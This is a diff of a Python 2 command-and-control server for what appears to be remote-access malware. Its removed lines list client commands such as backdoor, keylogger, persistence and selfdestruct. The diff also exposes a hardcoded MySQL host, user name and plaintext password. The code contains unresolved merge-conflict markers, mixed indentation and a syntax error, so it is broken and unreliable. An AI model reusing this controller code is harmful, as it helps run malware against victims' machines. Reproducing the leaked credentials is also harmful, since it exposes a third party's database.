@@ -1,14 +1,12 @@
 #!/usr/bin/env python
 
-import os, sys, socket, threading, argparse, time, json, mysql.connector, termios, tty
+import os, sys, socket, threading, argparse, time, json, mysql.connector
 from requests import post
 from base64 import b64encode, b64decode
 from binascii import hexlify, unhexlify
 from Crypto.Cipher import AES
 from Crypto.Hash import SHA256, HMAC
 from Crypto.Util.number import bytes_to_long, long_to_bytes
-
-CLIENT_COMMANDS = [ 'backdoor','cat','client','clients','decrypt','download','encrypt','enum','execute','help','info','keylogger','kill','lan','ls','persistence','pwd','quit','register','scan','selfdestruct','update','upload','wget']
 
 HELP_CMDS = ''' 
 ---------------------------------------------------------------------------
@@ -120,7 +118,11 @@ class Server(threading.Thread):
         return unhexlify(str().join(block[n] for n in p))
 
     def run(self):
+<<<<<<< HEAD
         while True:
+=======
+	while True:
+>>>>>>> b50a2f7f128ec872184af657ee406d263fc94580
             conn, addr = self.s.accept()
             client_id = self.client_count
             client = Client(conn, addr, client_id)
@@ -201,6 +203,7 @@ class Server(threading.Thread):
 
 class Client(threading.Thread):
     def __init__(self, conn, addr, uid):
+	global server
         super(Client, self).__init__()
         self.conn       = conn
         self.addr       = addr
@@ -208,9 +211,8 @@ class Client(threading.Thread):
         self.dhkey      = self.diffiehellman()
         self.mac        = bytes()
         self.registered = bool()
-        self.q          = Queue.Queue()
         self.current    = lambda:bool(server.current_client.uid == self.uid)
-        self.mysql      = lambda:mysql.connector.connect(host="mysql5019.smarterasp.net", user="a1eedc_imgur", password="10FUCKINGchar!", database="db_a1eedc_imgur")
+        self.mysql      = lambda:mysql.connector.connect(host=raw_input("MySQL Host: ", user=raw_input("MySQL User: "), password=raw_input("MySQL Password: "), database=raw_input("MySQL Database: "))
 
     def diffiehellman(self, bits=2048):
         p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
@@ -280,17 +282,21 @@ class Client(threading.Thread):
                 return'Query returned no output'
 
     def run(self):
-        global server
         while True:
             cmd_buffer = ""
             while "\n" not in cmd_buffer:
                 cmd_buffer += self.conn.recv(4096)
-                method, _, data = cmd_buffer.partition(':')
-                client_data = self.decrypt(data)
+            method, _, data = cmd_buffer.partition(':')
+            client_data = self.decrypt(data)
             if 'prompt' in method:
+<<<<<<< HEAD
                 client_buffer = client_data.format(self.uid)
                 print client_buffer,
                 client_buffer += raw_input('')
+=======
+		client_buffer = ""
+                print client_data.format(self.uid),
+>>>>>>> b50a2f7f128ec872184af657ee406d263fc94580
                 client_buffer += "\n"
                 self.sender(client_buffer)
             else:
